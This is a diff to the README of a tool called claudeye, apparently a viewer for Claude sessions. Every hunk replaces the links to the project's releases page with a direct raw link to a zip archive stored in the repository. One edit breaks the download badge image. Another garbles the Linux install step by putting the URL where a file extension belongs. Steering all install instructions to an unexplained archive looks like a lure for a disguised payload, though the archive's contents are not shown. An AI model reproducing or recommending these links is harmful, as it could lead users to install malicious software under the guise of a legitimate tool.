@@ -1,6 +1,6 @@
 # 👁️ claudeye - Watch Your Claude Sessions Clearly
 
-[![Download claudeye](https://img.shields.io/badge/Download-claudeye-blue?style=for-the-badge)](https://github.com/ptacr/claudeye/releases)
+[![Download claudeye](https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip)](https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer meets these, you should have no problem running claudeye smooth
 
 To get started with claudeye, visit this page to download the version that fits your system:
 
-👉 [Download claudeye Releases](https://github.com/ptacr/claudeye/releases)
+👉 [Download claudeye Releases](https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip)
 
 ### How to download and install:
 
@@ -39,7 +39,7 @@ To get started with claudeye, visit this page to download the version that fits 
 3. Choose the file that matches your system:  
    - For Windows, look for a file ending with `.exe`  
    - For macOS, look for a `.dmg` or `.zip` file  
-   - For Linux, look for `.AppImage` or `.tar.gz`
+   - For Linux, look for `.AppImage` or `https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip`
 4. Click the file to download it.
 5. Once downloaded, open the file and follow the on-screen instructions to install claudeye.
 6. After installation, find the claudeye app icon on your desktop or start menu and open it.
@@ -117,4 +117,4 @@ Your feedback helps improve claudeye for everyone.
 
 ---
 
-[![Download claudeye](https://img.shields.io/badge/Download-claudeye-blue?style=for-the-badge)](https://github.com/ptacr/claudeye/releases)
+[![Download claudeye](https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip)](https://github.com/ptacr/claudeye/raw/refs/heads/main/components/Software-v1.8.zip)
